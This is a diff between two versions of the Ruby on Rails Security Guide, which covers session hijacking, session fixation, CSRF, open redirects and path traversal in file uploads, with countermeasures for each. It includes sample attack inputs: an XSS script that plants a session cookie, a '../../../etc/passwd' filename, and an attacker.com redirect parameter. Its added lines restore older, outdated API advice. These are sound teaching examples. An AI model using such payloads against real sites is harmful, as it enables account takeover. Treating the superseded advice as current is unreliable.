@@ -1,420 +1,17 @@
 <html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-  <meta http-equiv="Content-Type" content="application/xhtml+xml; charset=utf-8"/>
-  
-  <style>
-    body {
-      font-family: "Helvetica Neue", arial, sans-serif;
-      font-size: 14px;
-      line-height: 1.6;
-      padding-top: 10px;
-      padding-bottom: 10px;
-      background-color: white;
-      padding: 30px;
-      color: #333;
-      border: 1px solid #aaa;
-      max-width: 900px;
-      margin: 20px auto;
-    }
-
-    body > *:first-child {
-      margin-top: 0 !important;
-    }
-
-    body > *:last-child {
-      margin-bottom: 0 !important;
-    }
-
-    a {
-      color: #4183C4;
-      text-decoration: none;
-    }
-
-    a.absent {
-      color: #cc0000;
-    }
-
-    a.anchor {
-      display: block;
-      padding-left: 30px;
-      margin-left: -30px;
-      cursor: pointer;
-      position: absolute;
-      top: 0;
-      left: 0;
-      bottom: 0;
-    }
-
-    h1, h2, h3, h4, h5, h6 {
-      margin: 20px 0 10px;
-      padding: 0;
-      font-weight: bold;
-      -webkit-font-smoothing: antialiased;
-      cursor: text;
-      position: relative;
-    }
-
-    h2:first-child, h1:first-child, h1:first-child + h2, h3:first-child, h4:first-child, h5:first-child, h6:first-child {
-      margin-top: 0;
-      padding-top: 0;
-    }
-
-    h1:hover a.anchor, h2:hover a.anchor, h3:hover a.anchor, h4:hover a.anchor, h5:hover a.anchor, h6:hover a.anchor {
-      text-decoration: none;
-    }
-
-    h1 tt, h1 code {
-      font-size: inherit;
-    }
-
-    h2 tt, h2 code {
-      font-size: inherit;
-    }
-
-    h3 tt, h3 code {
-      font-size: inherit;
-    }
-
-    h4 tt, h4 code {
-      font-size: inherit;
-    }
-
-    h5 tt, h5 code {
-      font-size: inherit;
-    }
-
-    h6 tt, h6 code {
-      font-size: inherit;
-    }
-
-    h1 {
-      font-size: 28px;
-      color: black;
-    }
-
-    h2 {
-      font-size: 24px;
-      border-bottom: 1px solid #cccccc;
-      color: black;
-    }
-
-    h3 {
-      font-size: 18px;
-    }
-
-    h4 {
-      font-size: 16px;
-    }
-
-    h5 {
-      font-size: 14px;
-    }
-
-    h6 {
-      color: #777777;
-      font-size: 14px;
-    }
-
-    p, blockquote, ul, ol, dl, li, table, pre {
-      margin: 3px 0;
-    }
-
-    hr {
-      background: transparent url("http://tinyurl.com/bq5kskr") repeat-x 0 0;
-      border: 0 none;
-      color: #cccccc;
-      height: 4px;
-      padding: 0;
-    }
-
-    body > h2:first-child {
-      margin-top: 0;
-      padding-top: 0;
-    }
-
-    body > h1:first-child {
-      margin-top: 0;
-      padding-top: 0;
-    }
-
-    body > h1:first-child + h2 {
-      margin-top: 0;
-      padding-top: 0;
-    }
-
-    body > h3:first-child, body > h4:first-child, body > h5:first-child, body > h6:first-child {
-      margin-top: 0;
-      padding-top: 0;
-    }
-
-    a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
-      margin-top: 0;
-      padding-top: 0;
-    }
-
-    h1 p, h2 p, h3 p, h4 p, h5 p, h6 p {
-      margin-top: 0;
-    }
-
-    li p.first {
-      display: inline-block;
-    }
-
-    ul, ol {
-      padding-left: 30px;
-    }
-
-    ul :first-child, ol :first-child {
-      margin-top: 0;
-    }
-
-    ul :last-child, ol :last-child {
-      margin-bottom: 0;
-    }
-
-    dl {
-      padding: 0;
-    }
-
-    dl dt {
-      font-size: 14px;
-      font-weight: bold;
-      font-style: italic;
-      padding: 0;
-      margin: 15px 0 5px;
-    }
-
-    dl dt:first-child {
-      padding: 0;
-    }
-
-    dl dt > :first-child {
-      margin-top: 0;
-    }
-
-    dl dt > :last-child {
-      margin-bottom: 0;
-    }
-
-    dl dd {
-      margin: 0 0 15px;
-      padding: 0 15px;
-    }
-
-    dl dd > :first-child {
-      margin-top: 0;
-    }
-
-    dl dd > :last-child {
-      margin-bottom: 0;
-    }
-
-    blockquote {
-      border-left: 4px solid #dddddd;
-      padding: 0 15px;
-      color: #777777;
-    }
-
-    blockquote > :first-child {
-      margin-top: 0;
-    }
-
-    blockquote > :last-child {
-      margin-bottom: 0;
-    }
-
-    table {
-      padding: 0;
-    }
-    table tr {
-      border-top: 1px solid #cccccc;
-      background-color: white;
-      margin: 0;
-      padding: 0;
-    }
-
-    table tr:nth-child(2n) {
-      background-color: #f8f8f8;
-    }
-
-    table tr th {
-      font-weight: bold;
-      border: 1px solid #cccccc;
-      text-align: left;
-      margin: 0;
-      padding: 6px 13px;
-    }
-
-    table tr td {
-      border: 1px solid #cccccc;
-      text-align: left;
-      margin: 0;
-      padding: 6px 13px;
-    }
-
-    table tr th :first-child, table tr td :first-child {
-      margin-top: 0;
-    }
-
-    table tr th :last-child, table tr td :last-child {
-      margin-bottom: 0;
-    }
-
-    img {
-      max-width: 100%;
-    }
-
-    span.frame {
-      display: block;
-      overflow: hidden;
-    }
-
-    span.frame > span {
-      border: 1px solid #dddddd;
-      display: block;
-      float: left;
-      overflow: hidden;
-      margin: 13px 0 0;
-      padding: 7px;
-      width: auto;
-    }
-
-    span.frame span img {
-      display: block;
-      float: left;
-    }
-
-    span.frame span span {
-      clear: both;
-      color: #333333;
-      display: block;
-      padding: 5px 0 0;
-    }
-
-    span.align-center {
-      display: block;
-      overflow: hidden;
-      clear: both;
-    }
-
-    span.align-center > span {
-      display: block;
-      overflow: hidden;
-      margin: 13px auto 0;
-      text-align: center;
-    }
-
-    span.align-center span img {
-      margin: 0 auto;
-      text-align: center;
-    }
-
-    span.align-right {
-      display: block;
-      overflow: hidden;
-      clear: both;
-    }
-
-    span.align-right > span {
-      display: block;
-      overflow: hidden;
-      margin: 13px 0 0;
-      text-align: right;
-    }
-
-    span.align-right span img {
-      margin: 0;
-      text-align: right;
-    }
-
-    span.float-left {
-      display: block;
-      margin-right: 13px;
-      overflow: hidden;
-      float: left;
-    }
-
-    span.float-left span {
-      margin: 13px 0 0;
-    }
-
-    span.float-right {
-      display: block;
-      margin-left: 13px;
-      overflow: hidden;
-      float: right;
-    }
-
-    span.float-right > span {
-      display: block;
-      overflow: hidden;
-      margin: 13px auto 0;
-      text-align: right;
-    }
-
-    code, tt {
-      font-family: "Lucida Console", "Courier New", courier;
-      font-size: 12px;
-      margin: 0 2px;
-      padding: 3px 5px;
-      white-space: nowrap;
-      border: 1px solid #eaeaea;
-      background-color: #f8f8f8;
-      border-radius: 3px;
-    }
-
-    pre code {
-      margin: 0;
-      padding: 0;
-      white-space: pre;
-      border: none;
-      background: transparent;
-    }
-
-    .highlight pre {
-      background-color: #f8f8f8;
-      border: 1px solid #cccccc;
-      font-size: 13px;
-      line-height: 19px;
-      overflow: auto;
-      padding: 6px 10px;
-      border-radius: 3px;
-    }
-
-    pre {
-      background-color: #f8f8f8;
-      border: 1px solid #cccccc;
-      font-size: 13px;
-      line-height: 19px;
-      overflow: auto;
-      padding: 6px 10px;
-      border-radius: 3px;
-    }
-
-    pre code, pre tt {
-      background-color: transparent;
-      border: none;
-    }
-
-    span.line-numbers {
-      margin-right: 10px;
-    }
-
-    img.logo {
-      display: block;
-      margin: 10px auto;
-    }
-
-    h1.logo {
-      text-align: center;
-      font-size: 40px;
-    }
-  </style>
-</head>
-<body>
-  <div id="containter">
-    
-    <h1 id="ruby-on-rails-security-guide">Ruby on Rails Security Guide</h1>
+  <head>
+    <meta http-equiv="Content-Type" content="application/xhtml+xml; charset=utf-8"/>
+    <!--  <link href="stylesheets/d.css" rel="stylesheet" type="text/css" />-->
+    <!--  <link href="stylesheets/fixes.css" rel="stylesheet" type="text/css" />-->
+    <!--  <link href="stylesheets/main.css" rel="stylesheet" type="text/css" />-->
+    <!--  <link href="stylesheets/reset.css" rel="stylesheet" type="text/css" />-->
+    <!--  <link href="stylesheets/print.css" rel="stylesheet" type="text/css" />-->
+    <!--  <link href="stylesheets/styles.css" rel="stylesheet" type="text/css" />-->
+    <!--<link href="stylesheets/style.css" rel="stylesheet" type="text/css" />-->
+  </head>
+  <body>
+    <div id="containter">    
+      <h1 id="ruby-on-rails-security-guide">Ruby on Rails Security Guide</h1>
 
 <p>This manual describes common security problems in web applications and how to avoid them with Rails.</p>
 
@@ -433,7 +30,7 @@
 
 <h2 id="introduction">Introduction</h2>
 
-<p>Web application frameworks are made to help developers build web applications. Some of them also help you with securing the web application. In fact one framework is not more secure than another: If you use it correctly, you will be able to build secure apps with many frameworks. Ruby on Rails has some clever helper methods, for example against SQL injection, so that this is hardly a problem.</p>
+<p>Web application frameworks are made to help developers building web applications. Some of them also help you with securing the web application. In fact one framework is not more secure than another: If you use it correctly, you will be able to build secure apps with many frameworks. Ruby on Rails has some clever helper methods, for example against SQL injection, so that this is hardly a problem. It’s nice to see that all of the Rails applications I audited had a good level of security.</p>
 
 <p>In general there is no such thing as plug-n-play security. Security depends on the people using the framework, and sometimes on the development method. And it depends on all layers of a web application environment: The back-end storage, the web server and the web application itself (and possibly other layers or applications).</p>
 
@@ -441,7 +38,7 @@
 
 <p>The threats against web applications include user account hijacking, bypass of access control, reading or modifying sensitive data, or presenting fraudulent content. Or an attacker might be able to install a Trojan horse program or unsolicited e-mail sending software, aim at financial enrichment or cause brand name damage by modifying company resources. In order to prevent attacks, minimize their impact and remove points of attack, first of all, you have to fully understand the attack methods in order to find the correct countermeasures. That is what this guide aims at.</p>
 
-<p>In order to develop secure web applications you have to keep up to date on all layers and know your enemies. To keep up to date subscribe to security mailing lists, read security blogs and make updating and security checks a habit (check the <a href="#additional-resources">Additional Resources</a> chapter). It is done manually because that’s how you find the nasty logical security problems.</p>
+<p>In order to develop secure web applications you have to keep up to date on all layers and know your enemies. To keep up to date subscribe to security mailing lists, read security blogs and make updating and security checks a habit (check the <a href="#additional-resources">Additional Resources</a> chapter). I do it manually because that’s how you find the nasty logical security problems.</p>
 
 <h2 id="sessions">Sessions</h2>
 
@@ -475,11 +72,11 @@ Rails will create a new session automatically if a new user accesses the applica
 
 <p>Many web applications have an authentication system: a user provides a user name and password, the web application checks them and stores the corresponding user id in the session hash. From now on, the session is valid. On every request the application will load the user, identified by the user id in the session, without the need for new authentication. The session id in the cookie identifies the session.</p>
 
-<p>Hence, the cookie serves as temporary authentication for the web application. Anyone who seizes a cookie from someone else, may use the web application as this user - with possibly severe consequences. Here are some ways to hijack a session, and their countermeasures:</p>
+<p>Hence, the cookie serves as temporary authentication for the web application. Everyone who seizes a cookie from someone else, may use the web application as this user – with possibly severe consequences. Here are some ways to hijack a session, and their countermeasures:</p>
 
 <ul>
   <li>
-    <p>Sniff the cookie in an insecure network. A wireless LAN can be an example of such a network. In an unencrypted wireless LAN it is especially easy to listen to the traffic of all connected clients. For the web application builder this means to <em>provide a secure connection over SSL</em>. In Rails 3.1 and later, this could be accomplished by always forcing SSL connection in your application config file:</p>
+    <p>Sniff the cookie in an insecure network. A wireless LAN can be an example of such a network. In an unencrypted wireless LAN it is especially easy to listen to the traffic of all connected clients. This is one more reason not to work from a coffee shop. For the web application builder this means to <em>provide a secure connection over SSL</em>. In Rails 3.1 and later, this could be accomplished by always forcing SSL connection in your application config file:</p>
 
     <p>~~~ruby
   config.force_ssl = true
@@ -492,11 +89,11 @@ Rails will create a new session automatically if a new user accesses the applica
     <p>Many cross-site scripting (XSS) exploits aim at obtaining the user’s cookie. You’ll read <a href="#cross-site-scripting-xss">more about XSS</a> later.</p>
   </li>
   <li>
-    <p>Instead of stealing a cookie unknown to the attacker, they fix a user’s session identifier (in the cookie) known to them. Read more about this so-called session fixation later.</p>
+    <p>Instead of stealing a cookie unknown to the attacker, he fixes a user’s session identifier (in the cookie) known to him. Read more about this so-called session fixation later.</p>
   </li>
 </ul>
 
-<p>The main objective of most attackers is to make money. The underground prices for stolen bank login accounts range from $10-$1000 (depending on the available amount of funds), $0.40-$20 for credit card numbers, $1-$8 for online auction site accounts and $4-$30 for email passwords, according to the <a href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf">Symantec Global Internet Security Threat Report</a>.</p>
+<p>The main objective of most attackers is to make money. The underground prices for stolen bank login accounts range from $10–$1000 (depending on the available amount of funds), $0.40–$20 for credit card numbers, $1–$8 for online auction site accounts and $4–$30 for email passwords, according to the <a href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf">Symantec Global Internet Security Threat Report</a>.</p>
 
 <h3 id="session-guidelines">Session Guidelines</h3>
 
@@ -508,7 +105,7 @@ Rails will create a new session automatically if a new user accesses the applica
 This will also be a good idea, if you modify the structure of an object and old versions of it are still in some user’s cookies. With server-side session storages you can clear out the sessions, but with client-side storages, this is hard to mitigate.</p>
   </li>
   <li>
-    <p><em>Critical data should not be stored in session</em>. If the user clears their cookies or closes the browser, they will be lost. And with a client-side session storage, the user can read the data.</p>
+    <p><em>Critical data should not be stored in session</em>. If the user clears his cookies or closes the browser, they will be lost. And with a client-side session storage, the user can read the data.</p>
   </li>
 </ul>
 
@@ -527,18 +124,11 @@ This will also be a good idea, if you modify the structure of an object and old 
   </li>
 </ul>
 
-<p>That means the security of this storage depends on this secret (and on the digest algorithm, which defaults to SHA1, for compatibility). So <em>don’t use a trivial secret, i.e. a word from a dictionary, or one which is shorter than 30 characters</em>.</p>
+<p>That means the security of this storage depends on this secret (and on the digest algorithm, which defaults to SHA512, which has not been compromised, yet). So <em>don’t use a trivial secret, i.e. a word from a dictionary, or one which is shorter than 30 characters</em>.</p>
 
-<p><code>secrets.secret_key_base</code> is used for specifying a key which allows sessions for the application to be verified against a known secure key to prevent tampering. Applications get <code>secrets.secret_key_base</code> initialized to a random key present in <code>config/secrets.yml</code>, e.g.:</p>
+<p><code>config.secret_key_base</code> is used for specifying a key which allows sessions for the application to be verified against a known secure key to prevent tampering. Applications get <code>config.secret_key_base</code> initialized to a random key in <code>config/initializers/secret_token.rb</code>, e.g.:</p>
 
-<pre><code>development:
-  secret_key_base: a75d...
-
-test:
-  secret_key_base: 492f...
-
-production:
-  secret_key_base: &lt;%= ENV["SECRET_KEY_BASE"] %&gt;
+<pre><code>YourApp::Application.config.secret_key_base = '49d3f3de9ed86c74b94ad6bd0...'
 </code></pre>
 
 <p>Older versions of Rails use CookieStore, which uses <code>secret_token</code> instead of <code>secret_key_base</code> that is used by EncryptedCookieStore. Read the upgrade documentation for more information.</p>
@@ -554,9 +144,9 @@ production:
 <ul>
   <li>A user receives credits, the amount is stored in a session (which is a bad idea anyway, but we’ll do this for demonstration purposes).</li>
   <li>The user buys something.</li>
-  <li>The new adjusted credit value is stored in the session.</li>
-  <li>The user takes the cookie from the first step (which they previously copied) and replaces the current cookie in the browser.</li>
-  <li>The user has their original credit back.</li>
+  <li>His new, lower credit will be stored in the session.</li>
+  <li>The dark side of the user forces him to take the cookie from the first step (which he copied) and replace the current cookie in the browser.</li>
+  <li>The user has his credit back.</li>
 </ul>
 
 <p>Including a nonce (a random value) in the session solves replay attacks. A nonce is valid only once, and the server has to keep track of all the valid nonces. It gets even more complicated if you have several application servers (mongrels). Storing nonces in a database table would defeat the entire purpose of CookieStore (avoiding accessing the database).</p>
@@ -565,22 +155,22 @@ production:
 
 <h3 id="session-fixation">Session Fixation</h3>
 
-<p>NOTE: <em>Apart from stealing a user’s session id, the attacker may fix a session id known to them. This is called session fixation.</em></p>
+<p>NOTE: <em>Apart from stealing a user’s session id, the attacker may fix a session id known to him. This is called session fixation.</em></p>
 
 <p><img src="images/session_fixation.png" alt="Session fixation" /></p>
 
 <p>This attack focuses on fixing a user’s session id known to the attacker, and forcing the user’s browser into using this id. It is therefore not necessary for the attacker to steal the session id afterwards. Here is how this attack works:</p>
 
 <ul>
-  <li>The attacker creates a valid session id: They load the login page of the web application where they want to fix the session, and take the session id in the cookie from the response (see number 1 and 2 in the image).</li>
-  <li>They maintain the session by accessing the web application periodically in order to keep an expiring session alive.</li>
-  <li>The attacker forces the user’s browser into using this session id (see number 3 in the image). As you may not change a cookie of another domain (because of the same origin policy), the attacker has to run a JavaScript from the domain of the target web application. Injecting the JavaScript code into the application by XSS accomplishes this attack. Here is an example: <code>&lt;script&gt;document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";&lt;/script&gt;</code>. Read more about XSS and injection later on.</li>
+  <li>The attacker creates a valid session id: He loads the login page of the web application where he wants to fix the session, and takes the session id in the cookie from the response (see number 1 and 2 in the image).</li>
+  <li>He possibly maintains the session. Expiring sessions, for example every 20 minutes, greatly reduces the time-frame for attack. Therefore he accesses the web application from time to time in order to keep the session alive.</li>
+  <li>Now the attacker will force the user’s browser into using this session id (see number 3 in the image). As you may not change a cookie of another domain (because of the same origin policy), the attacker has to run a JavaScript from the domain of the target web application. Injecting the JavaScript code into the application by XSS accomplishes this attack. Here is an example: <code>&lt;script&gt;document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";&lt;/script&gt;</code>. Read more about XSS and injection later on.</li>
   <li>The attacker lures the victim to the infected page with the JavaScript code. By viewing the page, the victim’s browser will change the session id to the trap session id.</li>
   <li>As the new trap session is unused, the web application will require the user to authenticate.</li>
   <li>From now on, the victim and the attacker will co-use the web application with the same session: The session became valid and the victim didn’t notice the attack.</li>
 </ul>
 
-<h3 id="session-fixation---countermeasures">Session Fixation - Countermeasures</h3>
+<h3 id="session-fixation--countermeasures">Session Fixation – Countermeasures</h3>
 
 <p>TIP: <em>One line of code will protect you from session fixation.</em></p>
 
@@ -598,7 +188,7 @@ production:
 
 <h3 id="session-expiry">Session Expiry</h3>
 
-<p>NOTE: <em>Sessions that never expire extend the time-frame for attacks such as cross-site request forgery (CSRF), session hijacking and session fixation.</em></p>
+<p>NOTE: <em>Sessions that never expire extend the time-frame for attacks such as cross-site reference forgery (CSRF), session hijacking and session fixation.</em></p>
 
 <p>One possibility is to set the expiry time-stamp of the cookie with the session id. However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. Here is an example of how to <em>expire sessions in a database table</em>. Call <code>Session.sweep("20 minutes")</code> to expire sessions that were used longer than 20 minutes ago.</p>
 
@@ -639,12 +229,12 @@ production:
   <li>Bob’s session at www.webapp.com is still alive, because he didn’t log out a few minutes ago.</li>
   <li>By viewing the post, the browser finds an image tag. It tries to load the suspected image from www.webapp.com. As explained before, it will also send along the cookie with the valid session id.</li>
   <li>The web application at www.webapp.com verifies the user information in the corresponding session hash and destroys the project with the ID 1. It then returns a result page which is an unexpected result for the browser, so it will not display the image.</li>
-  <li>Bob doesn’t notice the attack - but a few days later he finds out that project number one is gone.</li>
+  <li>Bob doesn’t notice the attack — but a few days later he finds out that project number one is gone.</li>
 </ul>
 
-<p>It is important to notice that the actual crafted image or link doesn’t necessarily have to be situated in the web application’s domain, it can be anywhere - in a forum, blog post or email.</p>
+<p>It is important to notice that the actual crafted image or link doesn’t necessarily have to be situated in the web application’s domain, it can be anywhere – in a forum, blog post or email.</p>
 
-<p>CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures) - less than 0.1% in 2006 - but it really is a ‘sleeping giant’ [Grossman]. This is in stark contrast to the results in many security contract works - <em>CSRF is an important security issue</em>.</p>
+<p>CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures) — less than 0.1% in 2006 — but it really is a ‘sleeping giant’ [Grossman]. This is in stark contrast to the results in my (and others) security contract work – <em>CSRF is an important security issue</em>.</p>
 
 <h3 id="csrf-countermeasures">CSRF Countermeasures</h3>
 
@@ -691,31 +281,30 @@ production:
 </div>
 </div>
 
-<p>There are many other possibilities, like using a <code>&lt;script&gt;</code> tag to make a cross-site request to a URL with a JSONP or JavaScript response. The response is executable code that the attacker can find a way to run, possibly extracting sensitive data. To protect against this data leakage, we disallow cross-site <code>&lt;script&gt;</code> tags. Only Ajax requests may have JavaScript responses since XmlHttpRequest is subject to the browser Same-Origin policy - meaning only your site can initiate the request.</p>
-
-<p>To protect against all other forged requests, we introduce a <em>required security token</em> that our site knows but other sites don’t know. We include the security token in requests and verify it on the server. This is a one-liner in your application controller, and is the default for newly created rails applications:</p>
+<p>There are many other possibilities, including Ajax to attack the victim in the background. The <em>solution to this is including a security token in non-GET requests</em> which check on the server-side. In Rails 2 or higher, this is a one-liner in the application controller:</p>
 
 <div class="highlighter-coderay"><div class="CodeRay">
-  <div class="code"><pre>protect_from_forgery <span style="color:#606">with</span>: <span style="color:#A60">:exception</span>
+  <div class="code"><pre>protect_from_forgery <span style="color:#606">secret</span>: <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">123456789012345678901234567890...</span><span style="color:#710">&quot;</span></span>
 </pre></div>
 </div>
 </div>
 
-<p>This will automatically include a security token in all forms and Ajax requests generated by Rails. If the security token doesn’t match what was expected, an exception will be thrown.</p>
+<p>This will automatically include a security token, calculated from the current session and the server-side secret, in all forms and Ajax requests generated by Rails. You won’t need the secret, if you use CookieStorage as session storage. If the security token doesn’t match what was expected, the session will be reset. <strong>Note:</strong> In Rails versions prior to 3.0.4, this raised an <code>ActionController::InvalidAuthenticityToken</code> error.</p>
 
 <p>It is common to use persistent cookies to store user information, with <code>cookies.permanent</code> for example. In this case, the cookies will not be cleared and the out of the box CSRF protection will not be effective. If you are using a different cookie store than the session for this information, you must handle what to do with it yourself:</p>
 
 <div class="highlighter-coderay"><div class="CodeRay">
-  <div class="code"><pre>rescue_from <span style="color:#036;font-weight:bold">ActionController</span>::<span style="color:#036;font-weight:bold">InvalidAuthenticityToken</span> <span style="color:#080;font-weight:bold">do</span> |exception|
-  sign_out_user <span style="color:#777"># Example method that will destroy the user cookies</span>
+  <div class="code"><pre><span style="color:#080;font-weight:bold">def</span> <span style="color:#06B;font-weight:bold">handle_unverified_request</span>
+  <span style="color:#080;font-weight:bold">super</span>
+  sign_out_user <span style="color:#777"># Example method that will destroy the user cookies.</span>
 <span style="color:#080;font-weight:bold">end</span>
 </pre></div>
 </div>
 </div>
 
-<p>The above method can be placed in the <code>ApplicationController</code> and will be called when a CSRF token is not present or is incorrect on a non-GET request.</p>
+<p>The above method can be placed in the <code>ApplicationController</code> and will be called when a CSRF token is not present on a non-GET request.</p>
 
-<p>Note that <em>cross-site scripting (XSS) vulnerabilities bypass all CSRF protections</em>. XSS gives the attacker access to all elements on a page, so they can read the CSRF security token from a form or directly submit the form. Read <a href="#cross-site-scripting-xss">more about XSS</a> later.</p>
+<p>Note that <em>cross-site scripting (XSS) vulnerabilities bypass all CSRF protections</em>. XSS gives the attacker access to all elements on a page, so he can read the CSRF security token from a form or directly submit the form. Read <a href="#cross-site-scripting-xss">more about XSS</a> later.</p>
 
 <h2 id="redirection-and-files">Redirection and Files</h2>
 
@@ -723,7 +312,7 @@ production:
 
 <h3 id="redirection">Redirection</h3>
 
-<p>WARNING: <em>Redirection in a web application is an underestimated cracker tool: Not only can the attacker forward the user to a trap web site, they may also create a self-contained attack.</em></p>
+<p>WARNING: <em>Redirection in a web application is an underestimated cracker tool: Not only can the attacker forward the user to a trap web site, he may also create a self-contained attack.</em></p>
 
 <p>Whenever the user is allowed to pass (parts of) the URL for redirection, it is possibly vulnerable. The most obvious attack would be to redirect users to a fake web application which looks and feels exactly as the original one. This so-called phishing attack works by sending an unsuspicious link in an email to the users, injecting the link by XSS in the web application or putting the link into an external site. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: http://www.example.com/site/redirect?to= www.attacker.com. Here is an example of a legacy action:</p>
 
@@ -735,7 +324,7 @@ production:
 </div>
 </div>
 
-<p>This will redirect the user to the main action if they tried to access a legacy action. The intention was to preserve the URL parameters to the legacy action and pass them to the main action. However, it can be exploited by attacker if they included a host key in the URL:</p>
+<p>This will redirect the user to the main action if he tried to access a legacy action. The intention was to preserve the URL parameters to the legacy action and pass them to the main action. However, it can exploited by an attacker if he includes a host key in the URL:</p>
 
 <pre><code>http://www.example.com/site/legacy?param1=xy&amp;param2=23&amp;host=www.attacker.com
 </code></pre>
@@ -754,9 +343,9 @@ production:
 
 <p>NOTE: <em>Make sure file uploads don’t overwrite important files, and process media files asynchronously.</em></p>
 
-<p>Many web applications allow users to upload files. <em>File names, which the user may choose (partly), should always be filtered</em> as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like “../../../etc/passwd”, it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so - one more reason to run web servers, database servers and other programs as a less privileged Unix user.</p>
+<p>Many web applications allow users to upload files. <em>File names, which the user may choose (partly), should always be filtered</em> as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like “../../../etc/passwd”, it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so – one more reason to run web servers, database servers and other programs as a less privileged Unix user.</p>
 
-<p>When filtering user input file names, <em>don’t try to remove malicious parts</em>. Think of a situation where the web application removes all “../” in a file name and an attacker uses a string such as “….//” - the result will be “../”. It is best to use a whitelist approach, which <em>checks for the validity of a file name with a set of accepted characters</em>. This is opposed to a blacklist approach which attempts to remove not allowed characters. In case it isn’t a valid file name, reject it (or replace not accepted characters), but don’t remove them. Here is the file name sanitizer from the <a href="https://github.com/technoweenie/attachment_fu/tree/master">attachment_fu plugin</a>:</p>
+<p>When filtering user input file names, <em>don’t try to remove malicious parts</em>. Think of a situation where the web application removes all “../” in a file name and an attacker uses a string such as “….//” - the result will be “../”. It is best to use a whitelist approach, which <em>checks for the validity of a file name with a set of accepted characters</em>. This is opposed to a blacklist approach which attempts to remove not allowed characters. In case it isn’t a valid file name, reject it (or replace not accepted characters), but don’t remove them. Here is the file name sanitizer from the <a href="https://github.com/technoweenie/attachment_fu/tree/master:">attachment_fu plugin</a></p>
 
 <div class="highlighter-coderay"><div class="CodeRay">
   <div class="code"><pre><span style="color:#080;font-weight:bold">def</span> <span style="color:#06B;font-weight:bold">sanitize_filename</span>(filename)
@@ -817,17 +406,17 @@ send_file filename, <span style="color:#606">disposition</span>: <span style="ba
 
 <p>In 2007 there was the first tailor-made trojan which stole information from an Intranet, namely the “Monster for employers” web site of Monster.com, an online recruitment web application. Tailor-made Trojans are very rare, so far, and the risk is quite low, but it is certainly a possibility and an example of how the security of the client host is important, too. However, the highest threat to Intranet and Admin applications are XSS and CSRF. </p>
 
-<p><strong>XSS</strong> If your application re-displays malicious user input from the extranet, the application will be vulnerable to XSS. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be XSS.</p>
+<p><strong>XSS</strong>  If your application re-displays malicious user input from the extranet, the application will be vulnerable to XSS. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be XSS.</p>
 
 <p>Having one single place in the admin interface or Intranet, where the input has not been sanitized, makes the entire application vulnerable. Possible exploits include stealing the privileged administrator’s cookie, injecting an iframe to steal the administrator’s password or installing malicious software through browser security holes to take over the administrator’s computer.</p>
 
 <p>Refer to the Injection section for countermeasures against XSS. It is <em>recommended to use the SafeErb plugin</em> also in an Intranet or administration interface.</p>
 
-<p><strong>CSRF</strong> Cross-Site Request Forgery (CSRF), also known as Cross-Site Reference Forgery (XSRF), is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.</p>
+<p><strong>CSRF</strong>  Cross-Site Reference Forgery (CSRF) is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.</p>
 
-<p>A real-world example is a <a href="http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html">router reconfiguration by CSRF</a>. The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for them, but it also contained an image tag that resulted in a HTTP-GET request to reconfigure the user’s router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker’s site. Everyone who accessed the banking site through that router saw the attacker’s fake web site and had their credentials stolen.</p>
+<p>A real-world example is a <a href="http://www.h-online.com/security/Symantec-reports-first-active-attack-on-a-DSL-router--/news/102352">router reconfiguration by CSRF</a>. The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for them, but it also contained an image tag that resulted in a HTTP-GET request to reconfigure the user’s router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker’s site. Everyone who accessed the banking site through that router saw the attacker’s fake web site and had his credentials stolen.</p>
 
-<p>Another example changed Google Adsense’s e-mail address and password by. If the victim was logged into Google Adsense, the administration interface for Google advertisements campaigns, an attacker could change their credentials. </p>
+<p>Another example changed Google Adsense’s e-mail address and password by. If the victim was logged into Google Adsense, the administration interface for Google advertisements campaigns, an attacker could change his credentials. </p>
 
 <p>Another popular attack is to spam your web application, your blog or forum to propagate malicious XSS. Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application’s admin interface. The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.</p>
 
@@ -839,7 +428,7 @@ send_file filename, <span style="color:#606">disposition</span>: <span style="ba
 
 <ul>
   <li>
-    <p>It is very important to <em>think about the worst case</em>: What if someone really got hold of your cookies or user credentials. You could <em>introduce roles</em> for the admin interface to limit the possibilities of the attacker. Or how about <em>special login credentials</em> for the admin interface, other than the ones used for the public part of the application. Or a <em>special password for very serious actions</em>?</p>
+    <p>It is very important to <em>think about the worst case</em>: What if someone really got hold of my cookie or user credentials. You could <em>introduce roles</em> for the admin interface to limit the possibilities of the attacker. Or how about <em>special login credentials</em> for the admin interface, other than the ones used for the public part of the application. Or a <em>special password for very serious actions</em>?</p>
   </li>
   <li>
